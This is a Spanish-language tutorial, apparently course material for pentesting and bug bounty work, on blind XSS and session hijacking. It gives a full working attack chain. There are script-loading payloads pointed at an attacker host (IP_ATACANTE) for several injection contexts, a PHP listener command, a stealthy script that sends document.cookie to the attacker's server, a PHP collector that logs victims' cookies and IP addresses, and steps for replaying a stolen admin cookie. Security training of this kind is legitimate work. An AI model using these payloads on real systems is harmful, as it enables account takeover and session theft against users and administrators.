# Ataque: Secuestro de sesión (Session Hijacking) y Blind XSS

## El principio: una cookie vale tanto como una contraseña

Como se ha visto repetidamente a lo largo de este temario (bloques de *Web Requests* e *Introducción a Aplicaciones Web*), las aplicaciones web modernas usan cookies para mantener la sesión activa sin pedir credenciales en cada petición. Esto implica una consecuencia directa: **si un atacante obtiene una cookie de sesión válida, puede suplantar completamente al usuario** sin conocer jamás su usuario ni contraseña.

Con capacidad de ejecutar JavaScript en el navegador de la víctima vía XSS, exfiltrar `document.cookie` hacia un servidor propio es el ataque de **secuestro de sesión** (*session hijacking*), también llamado *cookie stealing*.

## El caso especial: Blind XSS

Hasta ahora, todos los ejemplos asumían que se podía **ver** el resultado de la inyección directamente. Pero existen escenarios donde el payload se ejecuta en una página a la que el atacante **no tiene acceso** — típicamente, paneles de administración, donde solo un administrador ve el dato inyectado.

Vectores habituales de Blind XSS:

- Formularios de contacto
- Reseñas o valoraciones de producto
- Detalles de perfil de usuario, visibles solo en un panel admin
- Tickets de soporte técnico
- La cabecera HTTP `User-Agent` (registrada y mostrada en algún dashboard interno)

## El problema de no poder "ver" si funcionó

Sin acceso al panel donde se renderiza el payload, surgen dos preguntas:

1. **¿Qué campo concreto es vulnerable?** Si hay varios campos en un formulario, cualquiera podría ser el responsable.
2. **¿Qué payload funcionará?** Sin ver cómo se procesa la entrada, hay que probar a ciegas.

## La solución: cargar un script remoto identificable

En lugar de un payload autocontenido, se usa uno que **cargue un script externo** alojado en un servidor controlado por el atacante:

```html
<script src="http://IP_ATACANTE/script.js"></script>
```

El truco clave: nombrar la "ruta" solicitada según el **campo concreto** que se está probando:

```html
<script src="http://IP_ATACANTE/username"></script>
<script src="http://IP_ATACANTE/fullname"></script>
```

Si el servidor del atacante recibe una petición a `/username`, eso confirma de forma inequívoca que **ese campo concreto** ejecutó el payload — resolviendo el primer problema sin necesidad de ver nada del lado de la víctima.

### Variantes de payload para distintos contextos

```html
<script src=http://IP_ATACANTE></script>
'><script src=http://IP_ATACANTE></script>
"><script src=http://IP_ATACANTE></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://IP_ATACANTE\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//IP_ATACANTE");a.send();</script>
```

Variar el inicio (`'>`, `">`, sin prefijo) cubre distintos contextos de inyección, exactamente la misma lógica de "adaptar el payload al contexto" vista en el apartado de descubrimiento.

## Reduciendo el espacio de prueba

No todos los campos de un formulario son igualmente prometedores:

- Campos con **validación estricta de formato** (un email que se valida tanto en frontend como backend) suelen no ser explotables, ya que la validación rechaza cualquier entrada que no encaje en el patrón esperado.
- Campos de **contraseña** casi nunca son vulnerables, ya que típicamente se almacenan hasheados y nunca se muestran de vuelta en texto plano.

Descartar estos campos de antemano concentra el esfuerzo en los candidatos realmente plausibles.

## Montando el listener

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Probando cada payload, campo por campo, y observando si llega alguna petición al servidor — cuando llega, se ha identificado tanto el campo vulnerable como el payload funcional.

## De Blind XSS a robo de cookie: el payload final

Una vez confirmado el campo y el payload base, el siguiente paso es sustituir el script de "detección" por uno que exfiltre realmente la cookie:

```js
// script.js
new Image().src = 'http://IP_ATACANTE/index.php?c=' + document.cookie;
```

Se prefiere la técnica de `new Image().src` frente a redirigir directamente con `document.location`, porque cargar una imagen es una operación mucho menos sospechosa visualmente (no hay redirección perceptible) — manteniendo el ataque sigiloso incluso si alguien observa el comportamiento de la página.

### Capturando y organizando las cookies recibidas

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Este script separa múltiples pares cookie=valor (frecuentemente concatenados con `;`) y los registra ordenadamente, identificando además la IP de origen de cada víctima — útil cuando el ataque afecta a más de un usuario.

## Usando la cookie robada

Con la cookie capturada, el último paso es **inyectarla manualmente** en el propio navegador del atacante, sustituyendo cualquier cookie de sesión existente:

1. Abrir las DevTools del navegador → pestaña **Storage** → **Cookies**.
2. Crear (o editar) la cookie de sesión correspondiente con el valor robado.
3. Visitar la URL protegida de la aplicación — la sesión de la víctima (potencialmente, un administrador) queda completamente suplantada, sin haber usado nunca su usuario ni contraseña.

## Por qué Blind XSS combinado con session hijacking es uno de los hallazgos más críticos en bug bounty

Esta cadena completa —inyección en un campo de bajo privilegio, ejecución en un panel administrativo invisible para el atacante, exfiltración silenciosa de cookie, suplantación completa de sesión— es exactamente el tipo de hallazgo de alto impacto que se persigue en programas de *bug bounty* (tema que se desarrolla en detalle en el bloque de *Bug Bounty Hunting Process*): convierte un campo de entrada aparentemente trivial (un nombre, un comentario de soporte) en compromiso total de una cuenta con privilegios elevados.
